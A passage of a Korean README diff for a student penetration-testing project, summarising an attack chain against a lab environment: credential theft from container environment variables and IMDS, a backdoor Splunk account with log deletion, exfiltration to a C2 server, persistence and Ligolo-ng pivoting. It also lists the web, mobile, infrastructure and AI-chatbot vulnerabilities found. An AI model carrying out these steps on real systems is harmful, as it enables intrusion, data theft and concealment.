+| STEP 4 | `docker inspect`로 컨테이너 환경변수에서 DB 접속 정보·AWS 액세스 키·Django 시크릿 키 등 평문 탈취 → `outputs.conf`에서 내부망 Splunk 서버 IP(`10.0.128.172`) 확인 → AWS IMDS로 SSH 키페어 이름(`hackmin-key`) 조회 → `/root/hackmin-key.pem` 발견 및 탈취 |
+| STEP 5 | 탈취한 SSH 개인키로 내부망 Splunk EC2 접근 → `/etc/passwd` 수정으로 admin 비밀번호 리셋 → REST API 인증 획득 → **백도어 계정 생성 후 원본 passwd 복원으로 흔적 은닉** |
+| STEP 6 | 악성 수집 스크립트 배포 → Splunk 인덱스 로그·시스템 자격증명 수집 → C2 서버로 전송 |
+| STEP 7 | Splunk 인덱서 내 공격 관련 이벤트 삭제 (`\| delete`) → **systemd 타이머로 흔적 삭제 자동화** → systemd 서비스로 60초 주기 데이터 수집 자동화 → 재부팅 후에도 지속성 확보 |
+| STEP 8 | **Ligolo-ng로 내부망 피벗팅** → WAS EC2를 중계 지점으로 내부 IP 대역 탐색 → 포트 포워딩으로 공격자 로컬 8000번 포트에서 내부 Splunk 웹 UI 직접 접근 확인 |
+
+---
+
+### 취약점 진단 요약
+
+| 영역 | 주요 발견 취약점 |
+|---|---|
+| 웹 | Stored XSS, SQLi, IDOR, CSRF |
+| 모바일 | 루팅 탐지 우회, SSL Pinning 우회, GPS Mock 탐지 우회, 평문 데이터 저장 |
+| 인프라 | IAM 과도한 권한, IMDSv1 미적용, SSH 키페어 서버 내 노출, Cron 스크립트 권한 오설정, 컨테이너 환경변수 평문 자격증명 |
+| AI 챗봇 | 간접 프롬프트 인젝션, 민감정보 노출, 과도한 권한(DB 변경), 무제한 소비(rate limit 부재) |
+
+---
+
+### 📄 상세 보고서
+
+| 문서 | 링크 |
+|---|---|
+| 시나리오 1 결과보고서 | [docs/pentest/](docs/pentest/) |
+| 시나리오 2 결과보고서 | [docs/pentest/](docs/pentest/) |
+| 시나리오 3 결과보고서 | [docs/pentest/](docs/pentest/) |
+| 최종 프로젝트 결과보고서 | [docs/pentest/](docs/pentest/) |
+| 웹 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
+| 모바일 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
+| 인프라 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
+| 생성형 AI 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
+| 최종 발표자료 | [docs/presentation/](docs/presentation/) |
+
+---
+
+## 팀 정보
+
+**SK쉴더스 루키즈 31기 5조**
+
+| 이름 | 역할 |
+|---|---|
+| 김건하 | PM / 시나리오1 담당 (앱 보안기능 우회·IDOR·GPS 스푸핑·XSS+SQLi 공격 체인), 웹·모바일·인프라 진단 |
+| 팀원 | 시나리오1·2·3, 웹·모바일·인프라 진단 |
